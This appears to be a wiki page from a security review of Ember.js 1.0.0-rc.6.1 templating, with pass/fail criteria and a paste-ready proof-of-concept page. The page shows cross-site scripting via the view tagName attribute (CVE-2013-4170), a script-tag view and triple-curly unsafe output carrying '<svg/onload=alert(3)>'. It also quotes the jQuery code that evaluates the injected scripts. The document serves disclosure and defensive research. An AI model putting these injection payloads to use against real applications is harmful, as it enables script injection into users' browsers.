

# Introduction #

"Write dramatically less code with Ember's Handlebars integrated templates that update automatically when the underlying data changes.

Don't waste time making trivial choices. Ember.js incorporates common idioms so you can focus on what makes your app special, not reinventing the wheel.

Ember.js is built for productivity. Designed with developer ergonomics in mind, its friendly APIs help you get your job done—fast."

From http://emberjs.com/

# Quick Facts #

  * [Ember.js 1.0.0-rc.6.1 (Uncompressed)](http://builds.emberjs.com/ember-1.0.0-rc.6.1.js)
  * Usage Stats http://trends.builtwith.com/javascript/Ember
  * Dedicated Security Program & response process http://emberjs.com/security/
  * Security Mailing-List https://groups.google.com/forum/#!forum/ember-security

  * **{}SEC-A** <font color='red'><b>FAIL</b></font> Template expressions are parsed safely, yet it's possible to execute arbitrary JavaScript by design
  * **{}SEC-B** <font color='green'><b>PASS</b></font> An isolated execution scope for expressions exists
  * **{}SEC-C** <font color='green'><b>PASS</b></font> Only `SCRIPT` elements with proper type can serve as template containers
  * **{}SEC-D** <font color='red'><b>FAIL</b></font> No enforced separation, external templates recommended to be fetched via AJAX
  * **{}SEC-E** <font color='green'><b>PASS</b></font> SRP and security mailing list are in place and work excellently.

# Injection Attacks #

Ember.js uses an advanced parser to validate the expressions a developer can use inside the usual curlies. Unlike frameworks such as AngularJS, Ember.js is not vulnerable against "sandbox"-escapes such as the `constructor`-trick.

Earlier versions were nevertheless vulnerable against a concatenation-based bug in the `tagName` attribute of the view element. The bug has been fixed in version 1.0.0-rc.6.1.

## Attacks against View.tagName ##

The following "paste-and-go"-ready code example illustrates this issue. Furthermore, the `tagName` attribute can still be used for arbitrary script execution by simply creating a `<script>` element and filling the view with the JavaScript code to execute. ember.js also supports usage of triple-curlies to unsafely inject content. This is a feature most "mustache"-driven templating systems ship.

```
<!doctype html>
<html>
<head>
  <script src="http://code.jquery.com/jquery-1.10.2.js"></script>
  <script src="http://builds.emberjs.com/handlebars-1.0.0-rc.4.js"></script>
  <script src="http://builds.emberjs.com/ember-1.0.0-rc.6.1.js"></script>
  <script src="http://emberjs.com.s3.amazonaws.com/getting-started/ember-data.js"></script>
  <script src="http://emberjs.com.s3.amazonaws.com/getting-started/local_storage_adapter.js"></script>
  <script src="test.js"></script>
</head>
<body>
  <script>alert = function(a){
  	return confirm(a)
  }
  </script>
  <script type="text/x-handlebars" data-template-name="x">
      {{view tagName=[iframe src=javascript:alert(1)]}} <- fixed in 1.0.0-rc.6.1 (CVE-2013-4170)
      {{#view tagName=script}}alert(2){{/view}}
      {{#each controller}}{{{unsafe}}}{{/each}}
  </script>
</body>
```

test.js
```
window.X = Ember.Application.create();

X.Router.map(function () {
  this.resource('x', { path: '/' });
});

X.XRoute = Ember.Route.extend({
  model: function () {
    return X.X.find();
  }
});

X.Store = DS.Store.extend({
  revision: 12,
  adapter: 'DS.FixtureAdapter'
});

X.X = DS.Model.extend(  {
    id: 1,
    unsafe: '<svg/onload=alert(3)>'
});

X.X.FIXTURES = [{id:1}];

for (var name in Handlebars.templates) {
  var template = Handlebars.templates[name];
  Ember.TEMPLATES[name] = template;
}
```

## Script Execution via View.tagName ##

Ember.js calls its `appendTo()` method and thereby simply passes the dirty DOM-work over to jQuery (without Ember.js wouldn't run anyway). jQuery in its wisdom realizes that a `<script>` elements needs to be appended, parses its content and then evaluates this data.

```
appendTo: function(target) {
    this._insertElementLater(function() {
        Ember.assert("You cannot append to an existing Ember.View. Consider using Ember.ContainerView instead.", !Ember.$(target).is('.ember-view') && !Ember.$(target).parents().is('.ember-view'));
        this.$().appendTo(target);
    });
    return this;
}


[...]

// Evaluate executable scripts on first document insertion
for (i = 0; i < hasScripts; i++) {
    node = scripts[i];
    if (rscriptType.test(node.type || "") && 
        !jQuery._data(node, "globalEval") && jQuery.contains(doc, node)) {
                                
        if (node.src) {
            // Hope ajax is available...
            jQuery._evalUrl(node.src);
        } else {
            jQuery.globalEval((node.text || node.textContent || node.innerHTML || "").replace(rcleanScript, ""));
        }
    }
}
```